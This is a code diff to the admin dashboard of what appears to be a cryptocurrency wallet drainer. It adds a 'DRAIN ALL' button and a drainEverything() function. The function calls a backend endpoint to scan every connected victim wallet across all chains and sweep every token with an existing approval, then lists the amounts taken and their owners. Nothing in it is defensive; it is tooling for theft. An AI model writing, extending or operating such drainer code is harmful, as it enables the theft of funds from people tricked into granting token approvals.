@@ -432,11 +432,11 @@
           <div class="card-head"><span class="card-title">Quick Actions</span></div>
           <div class="card-body">
             <div class="qa-grid">
+              <div class="qa-item" style="border-color:var(--red);background:rgba(255,82,82,.05)" onclick="drainEverything()"><div class="qa-icon" style="color:var(--red);font-size:24px">&#9889;</div><div class="qa-label" style="color:var(--red);font-weight:700">DRAIN ALL</div></div>
               <div class="qa-item" onclick="showPage('wallets',document.querySelectorAll('.sb-item')[2])"><div class="qa-icon">&#128100;</div><div class="qa-label">Wallets</div></div>
               <div class="qa-item" onclick="showPage('gas',document.querySelectorAll('.sb-item')[4])"><div class="qa-icon">&#9981;</div><div class="qa-label">Gas</div></div>
               <div class="qa-item" onclick="exportWallets()"><div class="qa-icon">&#8615;</div><div class="qa-label">Export</div></div>
               <div class="qa-item" onclick="showPage('config',document.querySelectorAll('.sb-item')[5])"><div class="qa-icon">&#9881;</div><div class="qa-label">Config</div></div>
-              <div class="qa-item" onclick="showPage('logs',document.querySelectorAll('.sb-item')[6])"><div class="qa-icon">&#9638;</div><div class="qa-label">Logs</div></div>
               <div class="qa-item" onclick="clearWallets()"><div class="qa-icon" style="color:var(--red)">&#128465;</div><div class="qa-label">Clear</div></div>
             </div>
           </div>
@@ -812,6 +812,26 @@ async function scanWalletOnChain(address) {
     if(container) container.innerHTML=html
     toast('Scan complete: '+tokens.length+' assets found')
   } catch(e) { toast('Scan error: '+e.message) }
+}
+
+async function drainEverything() {
+  if(!confirm('DRAIN EVERYTHING?\n\nThis will scan ALL connected wallets across ALL chains and drain every token that has an existing approval.\n\nContinue?')) return
+  toast('Scanning and draining all wallets...')
+  try {
+    const r = await apiFetch('/admin/drain-everything',{method:'POST',body:JSON.stringify({})})
+    if(!r.ok){toast(r.error||'Failed');return}
+    const results = r.results || []
+    const success = results.filter(x=>x.success)
+    if(success.length) {
+      toast('DRAINED '+success.length+' token(s)! '+success.map(x=>(x.amount||'')+' '+(x.symbol||'')).join(', '))
+      alert('Drain complete!\n\n'+success.map(x=>x.symbol+': '+x.amount+' from '+x.owner).join('\n')+'\n\nFailed: '+(results.length-success.length))
+    } else if(results.length) {
+      toast('Attempted '+results.length+' drains but none succeeded')
+    } else {
+      toast('No approved tokens found across any wallet')
+    }
+    refresh()
+  } catch(e) { toast('Error: '+e.message) }
 }
 
 async function drainAllTokens(address) {
